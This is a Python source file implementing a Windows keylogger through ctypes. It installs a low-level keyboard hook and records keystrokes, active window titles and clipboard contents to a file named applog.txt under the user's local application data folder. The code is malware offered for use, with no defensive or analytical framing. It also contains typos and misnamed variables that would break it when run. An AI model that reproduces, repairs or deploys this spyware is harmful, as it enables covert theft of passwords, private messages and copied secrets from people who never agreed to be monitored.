from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename=(os.environ['localappdata'] +"\\" + 'applog.txt'), level=logging.DEBUG, format='%(message)s')

# load the required libraries
user32 = windll.user32
kernel32 = windll.kernel32

current_window = None   # holds the current window title
current_clipboard = []  # holds the current clipbaord content
last_key = None         # holds the last key pressed
line = ""               # holds the lines of keyboard characters pressed

# constants
WH_KEYBOARD_LL = 13     # Hook ID to pass to SetWindowsExA
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
HC_ACTION = 0           # Parameter for KeyboardProc callback function

VIRTUAL_KEYS = {'RETURN': 0x0D,
                'CONTROL': 0x11,
                'SHIFT': 0x10,
                'MENU': 0x12,
                'TAB': 0x09,
                'BACKSPACE': 0x08,
                'CLEAR': 0x0C,
                'CAPSLOCK': 0x14,
                'ESCAPE': 0x1B,
                'HOME': 0x24,
                'INS': 0x2D,
                'DEL': 0x2E,
                'END': 0x23,
                'PRINTSCREEN': 0x2C,
                'CANCEL':0x03
                }

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM)  # callback function

class KBDLLHOOKSTRUCT(Structure): _fields_=[
        ('vkCode',DWORD),
        ('scanCode',DWORD),
        ('flags',DWORD),
        ('time',DWORD),
        ('dwExtraInfo',DWORD)]

class hook:
    """
    Class for installing/uninstalling a hook
    """

    def __init__(self):
        """ 
        Constructor for hook class.

        Responsible for lalowing methods to call functions from user32.dll
        and kernel 32.dll.
        """
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None

    def install_hook(self, ptr):
        """
        Method for installing hook.

        Arguments
            ptr: pointer to the HOOKPROC callback function 
        """
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        """
        Method for uninstalling the hook.
        Optional (for testing)
        """
        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None

def get_current_window():   # Function to grab the current window and its title
    
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()    # Get handle to foreground window
    length = GetWindowTextLength(hwnd)  # Get length of the window text in title bar
    buff = create_unicode_buffer(length + 1)    # create buffer to store the window title string

    GetWindowText(hwnd, buff, length + 1)   # Get window title and store in buff

    return buff.value   # return the value of buff

def get_clipboard():

    CF_TEXT = 1 # set clipboard format

    # argument and return types for GlobalLock/GlobalUnlock
    kernel32.GlobalLock.argtypes = [c_void_p]
    kernel32.GlobalLock.restype = c_void_p
    kernel32.GlobalUnlock.argtypes = [c_void_p]

    # return type for GetClipboardData
    user32.GetClipboardData.restype = c_void_p
    user32.OpenClipbaord(0)

    # required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT)    # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get ptr to memory location where the data is stored
            text = c_char_p(data_locked)    # Get a char * ptr (string in Py) to the location of data_locked
            value = text.value # dump the content in value
            kernel32.GlobalUnlock(data_locked) # decrement the de lock count
            return value.decode('latin1')   # Return the clipboard content
    finally:
        CloseClipboard()    # close the clipboard

def hook_procedure(nCode, wParam, lParam):

    # need to be global so they're not emptied at every key pressed
    global last_key
    global current_clipboard
    global line
    global current_window

    if current_window != get_current_window():
        current_window = get_current_window()
        logging.info('[WINDOW] ' + current_window)

    if nCode == HC_ACTION and wParam == WM_KEYDOWN:

        kb = KBDLLHOOKSTRUCT.from_address(lparam)
        user32.GetKeyState(VIRUTAL_KEYS['SHIFT'])
        user32.GetKeyState(VIRTUAL_KEYS['MENU'])
        state = (c_char * 256)()
        user32.GetKeyboardState(byref(state))
        buff = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
        key = wstring_at(buff)  # key pressed as buffer
       
        if n > 0:

            # avoid logging weird characters. if they show up get the hex codde
            # and add to virtual_keys
            if kb.vkCode not in VIRTUAL_KEYS.values():
                line += key

            for key, value in VIRTUAL_KEYS.items():
                if kb.vkCode == value:
                    logging.info(key)

            if kb.vkCode == VIRTUAL_KEYS['RETURN']:
                logging.info(line)
                line = ""

            if current_clipboard != get_clipboard():
                current_clipboard = get_clipboard()
                logging.info('[CLIPBOARD] ' + current_clipboard + '\n')
                
    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(lParam))

hook = hook()
ptr = HOOKPROC(hook_procedure)
hook.install_hook(ptr)
msg = MSG()
user32.GetMessageA(byref(msg), 0, 0, 0)
